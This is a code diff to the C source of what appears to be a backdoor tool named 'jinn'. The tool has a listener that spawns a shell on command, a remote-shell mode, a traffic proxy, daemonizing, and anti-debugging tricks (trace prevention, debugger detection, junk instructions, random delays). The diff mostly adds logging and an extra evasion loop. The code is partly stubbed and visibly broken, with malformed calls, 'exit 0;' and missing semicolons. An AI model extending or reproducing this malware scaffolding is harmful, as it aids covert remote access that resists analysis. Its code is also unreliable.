@@ -7,10 +7,14 @@
 #include "functions.h"
 #include "jinn.h"
 
+char *log_path = NULL;
+int debugged = 0;
+
 
 int main_loop(int server_mode, int client_mode, char *host, int port, int log_flag)
 {
     if (server_mode) {
+      log_message("INFO", "Entering server mode. pid: %d", getpid());
       // Listen on TCP port, UDP port, and named pipe
       // Accept connections and handle incoming data
       // When "shell" command received, spawn shell
@@ -18,6 +22,7 @@ int main_loop(int server_mode, int client_mode, char *host, int port, int log_fl
       jinn_server_mode(int proto, char *host, int port, log_path);
     }
     else if (client_mode) {
+      log_message("INFO", "Entering client mode. pid: %d", getpid());
       // Connect to server via TCP, UDP, or pipe
       // Send data and receive responses
       jinn_client_mode(int proto, char *host, int port)
@@ -25,6 +30,19 @@ int main_loop(int server_mode, int client_mode, char *host, int port, int log_fl
 
     // Main event loop (select/poll/epoll)
     while (1) {
+      if (debugged == 0) {
+        if (is_debugged()) {
+          debugged = 1;
+          log_message("WARN", "Program is being debugged");
+          jinn_noop();
+          for (int i=0; i < 25 ; i++) {
+            delay_random_timing();
+            jinn_junk_inst();
+          }
+          jinn_noop();
+        }
+      }
+
       // Handle incoming connections/data
       // Check for commands (shell, command)
       // Process log 
@@ -32,23 +50,26 @@ int main_loop(int server_mode, int client_mode, char *host, int port, int log_fl
   return 0;
 }
 
+
 int main(int argc, char *argv[])
 {
+  log_message("INFO", "Program started as %s", argv[0]);
   int opt;
   int genie_flag = 0, datapipe_flag = 0, shell_flag = 0, command_flag = 0;
   int remote_flag = 0, daemon_flag = 0, log_flag = 0, server_flag = 0, client_flag = 0;
-  char *log_path = NULL;
   char *host = NULL;
   int port = 0;
   char *program_name;
-  int debugged = 0;
 
   // Initialize random
   srand(time(NULL));
 
 #ifndef DEBUG
   prevent_trace();
-  if (is_debugged()) debugged = 1;
+  if (is_debugged()) {
+    debugged = 1;
+    log_message("WARN", "Program is being debugged");
+  }
 #endif
 
   jinn_noop();
@@ -175,8 +196,8 @@ int main(int argc, char *argv[])
     genie_flag + datapipe_flag + shell_flag + command_flag + remote_flag;
   if (mode_count != 1)
     {
-      fprintf(stderr,
-              "Error: Must specify exactly one of -G, -D, -S, -C, or -r\n");
+      fprintf(stderr, "Error: Must specify exactly one of -G, -D, -S, -C, or -r\n");
+      log_message("ERROR", "Must specify exactly one of -G, -D, -S, -C, or -r");
       exit(1);
     }
 
@@ -184,24 +205,28 @@ int main(int argc, char *argv[])
   if (remote_flag && (!host || port <= 0))
     {
       fprintf(stderr, "Error: -r requires -H and -p arguments\n");
+      log_message("ERROR", " -r requires -H and -p arguments");
       exit(1);
     }
   // Validate remote-specific arguments
   if (data_flag && (!host || port <= 0))
     {
       fprintf(stderr, "Error: -D requires -H,-p,-L, and -P arguments\n");
+      log_message("ERROR", "-D requires -H,-p,-L, and -P arguments");
       exit(1);
     }
 
   // Initialize logging if requested
   if (log_flag)
     {
-      init_logging(log_path);
+      flush_log_to_path(log_path)
+      log_message("INFO", "Now logging to log file %s", log_path);
     }
 
   // Daemonize if requested
   if (daemon_flag)
     {
+      log_message("INFO", "Forking process into background");
       pid_t pid = fork();
       if (pid < 0) exit(1);
       if (pid > 0) exit(0);
@@ -211,11 +236,13 @@ int main(int argc, char *argv[])
   // Execute requested mode
   if (genie_flag)
     {
+      log_message("INFO", "Entering Genie mode");
       genie_mode();
       exit 0;
     }
   else if (datapipe_flag)
     {
+      log_message("INFO", "Entering datapipe/proxy mode");
       datapipe_mode();
       exit 0;
     }
@@ -229,6 +256,7 @@ int main(int argc, char *argv[])
     }
   else if (remote_flag)
     {
+      log_message("INFO", "Remote shell: %s, %d", host, port);
       remote_shell_mode(host, port);
       exit 0;
     }
